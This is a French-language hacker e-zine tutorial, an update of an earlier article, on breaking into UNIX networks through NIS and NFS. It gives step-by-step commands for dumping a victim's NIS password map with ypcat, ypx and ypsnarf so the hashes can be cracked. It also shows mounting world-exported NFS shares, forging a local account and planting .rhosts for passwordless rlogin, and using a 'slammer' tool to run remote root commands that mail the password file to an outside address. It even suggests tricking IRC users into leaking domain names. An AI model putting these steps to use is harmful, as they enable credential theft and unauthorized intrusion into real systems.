@@ -1,0 +1,344 @@
+                     N     N       ii        ssssss
+                     N N   N       ii        s
+                     N  N  N       ii        sssss
+                     N   N N       ii            ss
+                     N     N       ii        sssss
+
+
+
+	    Ceci Est Une Mise A Jour De L'article De Cod4 ! 
+
+** 1: C'est quoi NIS et a quoi ca sert ?
+ NIS est un service qui permet d'administrer sur une seule machine les
+principales base de donnees systeme d'un reseau UNIX. Les fichiers
+concernes sont /etc/passwd, /etc/groups, /etc/hosts, /etc/networks, etc etc.
+Maintenant, on va voir a quoi ca peut nous servir NIS (du point de vue d'un
+admin.). Imagine que tu as plusieurs accounts sur des machines. Le jour ou tu
+veux changer ton password, hehe!, tu vas devoir changer ton password sur
+chaque machine. Si tu as plus de 200 accounts, c'est poa evident! :( Par
+contre, avec NIS, tu as juste a changer une seule fois ton password, et c'est
+tout. Ensuite toutes les machines sont au courant de ce changement.
+
+ Voyons d'un peut plus pres le mecanisme ki peut realiser ce MiRaCLE ;).
+ Imaginons que la machine qui centralise NIS s'appelle BIBI. Toi, tu te
+connectes sur la machine LINDA. D'abord, on te demande ton login et mot de
+passe. Ensuite, le programme qui gere le login regarde si tu as un account en
+local. Pour cela elle regarde le /etc/passwd. (voici comment il se presente
+sur la machine LINDA)
+
+ #/etc/passwd
+ root:VcDtfTeRTTt45:0:1:bibi le boss:/:/bin/sh
+ bin:*:1:1::/usr/local/bin/noshell
+ gege:100:501: gege le mec ki bosse k'en local:/home/gege:/bin/sh
+ +foo
+
+ La, on voit que l'user foo (au fait, c'est *vous* ;)) n'est pas gere en local
+(c'est le +username qui indique une entree NIS). Donc, le programme de login
+va faire une requete NIS a la machine BIBI. Pour cela, il regarde le nom de
+domaine NIS sur lequel il doit effectuer sa recherche, pour consulter les
+cartes NIS necessaires a la verification de l'user. (note: les noms de
+domaines NIS sont differents du nom de domaine de la becane, et il peut avoir
+plusieurs noms de domaine sur une machine).
+
+ Voici en gros a koi resemble une carte NIS...
+
+ ---------------------------------------------------------------------------
+ X-OR:F45SdGhhIk.:234:789:X-or le chevalier de l'espace:/home/x-or:/bin/sh
+ foo:3DKF9kApLWx:233:253:foo le hacker fou:/home/foo:/bin/sh
+ ---------------------------------------------------------------------------
+
+ Donc voila, notre programme de login a plus qu'a lire l'entree pour l'user
+foo et le tour est joue :).
+
+ Vous avez tout compris? NON! Ben alors achetez un gros bouquin sur UNIX ;p
+Vous allez me dire: "C'est bien bOOOooOOOoOOOoO tout ca mais moi, petit hacker
+que je suis, a quoi ca va pouvoir bien de me servir ?" :)
+
+ Imagine... Tu fais un rpcinfo sur www.victim.com
+
+  $ rpcinfo -p www.victim.com              [NDR: le `$' n'est pas a taper!]
+   program  vers  proto  port
+   100004      2    tcp   673  ypserv
+   100005      1    udp   721  mountd
+   100003      2    udp  2049  nfs
+   100026      1    udp   733  bootparam
+
+ Victoire! il y'a ypserv donc forcement il y a NIS et encore re-victoire car
+il y a bootparam.Ypserv indique que la machine est le server NIS . Maintenant, il ne reste plus qu'a trouver le nom de domaine.
+Pour tester au pif un nom, on fait un ypwhich...
+
+  $ ypwhich -d victim  www.victim.com
+   bibi.victim.com
+
+ On sait que c'est la machine BIBI qui gere le NIS et on sait en plus que
+victim est bien le nom de domaine du NIS. Donc, ensuite, ce qui nous interesse
+c'est la carte passwd.byname (c'est le fichier /etc/passwd en gros ;). Pour
+cela, il y a DEUX facons: 1/ si on est a l'exterieur du domaine, on utilise un
+programme appelle ypx (ses sources se trouvent partout sur le web) ou alors on
+peut utiliser ypcat mais pour cela il faut modifier le fichier de
+configuration /etc/yp.conf (sous Linux).
+
+Voici la technique pour utiliser ypcat . Pour cela vous devez avoir le kit
+yp avec ypbind , ypserv , ypcat etc ... d'installe .
+
+Premierement il faut editer le fichier /etc/yp.conf
+Voici comment est constitue le fichier yp.conf :
+
+   ypserver 192.143.146.25
+
+L'ip 192.143.146.25 est l'adresse du server ou l'on trouve ypserv lorsque
+l'on lance la commande rpcinfo -p 192.143.146.25 .
+
+Voila votre fichier est maintenant configure.Maintenant il faut que votre
+machine est le meme domain name que le server a attaquer !
+On sait que le domain name du server a attaquer est victim .
+tappez la commande suivante :
+
+   # domainname victim ( ou ypdomainname victim ). Cela depend des system ..
+
+Voila votre machine a maintenant victim comme domain name .
+Maintenant vous lancer la commande suivante :
+
+   # ypbind
+
+Votre machine va maintenant comuniquee avec le server ou se trouve ypserv
+Now il ne reste plus qu'a lancer ceci :
+
+   # ypcat passwd
+
+Et la BinGo ! la map passwd.byname de la machine apparait ! Plus qu'a lancer
+le gentil cracker de passwd ! 
+
+Attention cette technique ne marche po sur toute les machines Linux et
+doir etre utilise en "root" !
+
+
+On peut aussi utliser la programme ypx en tappant ceci :
+
+ 
+   $ ypx -d -m passwd.byname  www.victim.com victim
+
+ Et hop!, la on a la carte NIS passwd.byname qui s'affiche. Y'a plus qu'a
+sauver ca et a le cracker trankillllooouuuu chez soi :)
+
+Voici une autre technique pour recuperer passwd.byname avec le programe
+ypsnarf en tappant la commande suivante :
+
+ypsnarf www.victim.com victim passwd.byname
+
+Attention nous n'avons po reussi a compiler ce prog sur des machine Linux .
+Ce programme a ete teste sur SunOs 4.1.x ou il fonctionne tres tres bien !
+
+---------------------------------------------------------------------------
+
+Le plus gros probleme est malhereusement de trouver de domain NIS de la
+machine . Voici les autres technique que vous pouvez utliser .
+Par exemple tappez ceci :
+
+
+    $ showmount -e www.victim.com
+   ...
+   /var (everyone)
+   ...
+
+ Le repertoire /var est exporte pour tous. Montez-le...
+
+    # mount -t nfs www.victim.com:/var /mnt ( la commande mount doir etre 
+executee en "root" ! )
+
+ Ensuite, allez voir dans /mnt/yp et puis je vous laisse le soin de deviner la
+suite :)
+
+ Si /var est pas exporte, il reste toujours bootparam. Pour cela utilisez
+encore une fois ypsnarf :
+
+   $ ypsnarf www.victim.com www.hacker.com
+
+Cette technique fonctionne rarement et j'avoue n'avoir trouver pour le
+moment de server ou cette fonction fonctionne . Mais il parait que Cod4 en
+avait deja trouve ...Je vous laisse donc le soins de chercher par vous meme
+:))
+
+
+ Vous avez toujours pas trouve ? argh! Il vous reste le SE :) Attendez qu'un
+jour un mec du domaine vienne sur IRC puis amenez-le a executer domainname sur
+sa becanne  et qu'il vous donne le resultat :)) Mais bon la faut un gros
+coup de CUL ! :))
+
+
+
+Si vous avez vraiment de la chance vous pourrez peut etre trouver des severs
+en utilisant showmout -e www.victim.com d'autre repertoire d'exporter plus
+interessant que /var .... par exemple / ou /home etc ...
+
+Voici donc un peu plus d'explication sur la commande shwomount .
+
+Par exemple, showmount sur notre cible donne:
+
+ evil $ showmount -e victim.com
+ export list for victim.com:
+ /export                            (everyone)
+ /var                               (everyone)
+ /usr                               easy
+ /export/exec/kvm/sun4c.sunos.4.1.3 easy
+ /export/root/easy                  easy
+ /export/swap/easy                  easy
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+                            HACKER'S NOTE
+La commande showmount avec l'option -e hostname permet de connaitre les
+systemes de fichiers effectivement exportes par le systeme distant
+hostname.
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+Remarque que /export/foo est exporte pour tout le monde. Remarque
+egalement que c'est le repertoire utilisateur de "guest". Il est temps
+pour nous de rentrer dans la machine! Dans le cas present, tu va monter
+(mount) le repertoire utilisateur de "guest". Comme tu n'as pas de
+compte correspondant sur la machine locale et comme le root ne peut pas
+modifier les fichiers sur un systeme de fichiers monte avec NFS, tu cree
+un compte "guest" dans ton fichier /etc/passwd local. En tant
+qu'utilisateur guest tu peut mettre un fichier .rhosts dans le repertoire
+utisateur distant de "guest", ce qui te permet de faire un rlogin sur la
+machine cible sans donner de mot de passe.
+
+
+
+ evil # mount victim.com:/export/foo /foo
+ evil # cd /foo
+ evil # ls -lag
+ total 3
+    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
+    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
+    1 drwx--x--x  9 10001    daemon       1024 Aug  3 15:49 guest
+ evil # echo guest:x:10001:1:temporary breakin account:/: >> /etc/passwd
+ evil # ls -lag
+ total 3
+    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
+    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
+    1 drwx--x--x  9 guest    daemon       1024 Aug  3 15:49 guest
+ evil # su guest
+ evil $ echo evil.com >> guest/.rhosts
+ evil $ rlogin victim.com
+         Welcome to victim.com!
+ victim $
+
+ Maintenant a vous de trouver un exploit qui vous permettra de passer"root".
+
+-----------------------------------------------------------------------------
+ 
+ Voici maintenant comment exploiter la programme ypbreack.c
+Ce programme n'a en fait aucune utilite mais je vais quand meme vous
+expliquer a quoi il peut servir ...
+
+Recupere le programme ypbreak.C et compile le ...
+
+Bon maintenant admetons que lorsque vous tappez rpcinfo -p www.victim.com
+vous avez ceci :
+
+program  vers  proto  port
+   100001      2    tcp   673  ypserv
+   100002      2    tcp   483  ypbind
+   100006      1    udp   648  yppasswdd
+   100005      1    udp   721  mountd
+   100003      2    udp  2049  nfs
+   100026      1    udp   733  bootparam
+ 
+Bingo ! il y a yppasswdd ..
+
+Bon ben c tt con . On sait que le domain name de la machine victim . Il
+suffit plus de tapper ceci :
+
+    $ ypbreak www.victim.com vitim
+
+      Enter account name :
+
+Enter un login qui existe dans le passwd de la machine que vous attaquez .
+par exemple le login fjones .
+
+Voici ce qui apparait ensuite :
+
+      fjones:DEfcee7Z5dz:69:168:Mr Jones:/home/fjones:/bin/bash
+
+      password :
+
+A ce moment la entrez le passwd de fjones ( pas le pass crypte ! ) . Vous aurez ensuite le choix
+suivant :
+
+      0. Quite
+      1. Name
+      2. Password
+      3. Gecos
+      4. shell
+      
+      Choice >
+
+Maintenant c a vous de jouer !
+Il est clair que ce programme n'est d'aucune utlite car toute ces
+operations sont plus facilement accessibles sur la machine www.victim.com.
+Ceci juste pour votrer comment exploiter yppasswdd . 
+
+--------------------------------------------------------------------------------
+
+Voici maintenant un programme beaucoup plus interressant :  Slammer.C
+Ce programme permet d'executer des commandes root directement d'une machine
+distantes . 
+
+    $	rpcinfo -p www.victim.com
+
+     program  vers  proto  port
+   100001      2    tcp   673  ypserv
+   100002      2    tcp   483  ypbind
+   100006      1    udp   648  keyserv
+   100005      1    udp   721  mountd
+   100003      2    udp  2049  nfs
+   100026      1    udp   733  ypupdated
+
+BINGO ! Il y a ypbind , keyserv et ypupdated . Il faut imperativement ces 3
+services pour utliser Slammer.c
+
+Ben Now il ne reste plus qu'a tapper ceci par exemple :
+
+   $ slammer www.victim.com " domainname | mail bibi@fuck.dst "
+
+Et Op vous allez recevoir un joli mail avec le nom de domain de la machine
+ce qui vous permettra d'utiliser ypx ou ypsnarf pour recupe la map NIS de la
+machine ( passwd.byname )
+
+Encore Mieux pour eviter de vous prendre la tete tappez ceci :
+
+   $ slammer www.victim.com " ypcat passwd | mail bibi@fuck.dst "
+
+Et re Op ! vous aller  recevoir un joli mail de www.victim.com avec le
+passwd de la machine :)))
+
+ A oue encore un truc important ! Si vous connaissez des homes de users ben
+il suffira de creer un .rhost avec + + dedans puis ensuite de faire :
+
+    $ rlogin www.victim.com -l user
+
+Et op vous voila entre sur la machine . 
+Il vous sera aussi possible de faire d'autre chose mais bon apres c a vous
+de voir ce que vous preferez ! :)
+
+Attentin ce programme ne fonctionne po sur toute les machines possedant ypbin
+keyserv et ypupdated .... Nous avons deja rencontre des machines sur lesquelles
+ce programme ne fonctionnait po ....
+
+PS: Les programmes ypsnarf.c , ypbreak.c et slammer.C ne sont compilables 
+que sur des systems SunOs . Si vous arrivez a les faire fonctionner sur Linux
+ben tenez nous au courrant ! :))
+
+
+Bon ben voila C fini !!
+Vous remarquerez que je j'ai repris les articles de COD4  que j'ai modifie
+et  mis a jours ... Je remercie donc Cod4 pour m'avoir permis d'avoir moins
+de choses a tapper ! :ppp
+
+A oue je fais aussi un chtit CouCou a Cleb et Doc|SeDoV avc qui on a pu
+mettre a jour ces techniques d'attaque, hOtCodE, Dhea, Kewl4, Sick_Bot, 
+Mayweed, Sorcery, Lordfrog, Darth, Hawiz, NoRace, FfT, MosFet, Stances, Nighty
+et tous ceux que j'ai oublie ! ( Qu'ils me pardonne :)) ..
+
+ 
